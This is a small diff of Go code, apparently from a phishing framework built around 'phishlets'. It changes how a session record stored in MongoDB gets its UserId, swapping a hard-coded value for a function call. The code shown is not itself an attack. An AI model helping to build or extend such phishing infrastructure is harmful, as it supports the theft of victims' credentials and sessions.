@@ -321,7 +321,7 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 		RemoteAddr:   remoteAddr,
 		CreateTime:   now,
 		UpdateTime:   now,
-		UserId:       "JEMEX123", // تعيين قيمة UserId الثابتة
+		UserId:       GetUserId(),
 		CountryCode:  "",
 		Country:      "",
 	}
